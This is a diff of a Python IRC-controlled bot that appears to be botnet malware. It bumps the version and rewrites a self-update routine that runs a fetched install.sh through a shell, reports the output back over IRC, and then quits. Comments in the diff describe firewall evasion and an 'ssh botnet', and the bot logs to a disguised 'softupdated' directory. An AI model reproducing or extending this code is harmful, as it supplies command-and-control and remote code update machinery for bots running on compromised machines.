@@ -30,7 +30,7 @@ from modules.logging import logfile, log
 #       openvpn     implement openvpn for firewall evasion
 #       reverse ssh ssh botnet implementation
 
-version = "5.9"                                                   # bot version
+version = "6.0"                                                   # bot version
 
 try:
     logfile(filename="/var/softupdated/bot_v%s.log" % version)                         # redirects bot output to logfile
@@ -423,13 +423,15 @@ def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):   # updates th
     pid = os.getpid()
     privmsg('[>]   Running install.sh')
     cmd = "cd /private/var/softupdated/code/*/; nohup /bin/sh install.sh %s &" % pid
-    import subprocess
-    p = subprocess.Popen([cmd],shell=True, stdout=PIPE, stderr=STDOUT, executable='/bin/bash')
-    privmsg("[+] Shutting down for update. Log saved in updatelog.txt")
-    quit_status = True
-    irc.send ( 'QUIT\r\n' )
-    raise SystemExit
-    sys.exit()
+    for line in run_shell(cmd):
+        log('[>]    ',line)
+        privmsg('[>]    %s' % line)
+        if line.find("Starting") != -1:
+            privmsg("[+] Shutting down for update. Log saved in updatelog.txt")
+            quit_status = True
+            irc.send ( 'QUIT\r\n' )
+            raise SystemExit
+            sys.exit()
 
 ############ The beef of things
 if __name__ == '__main__':
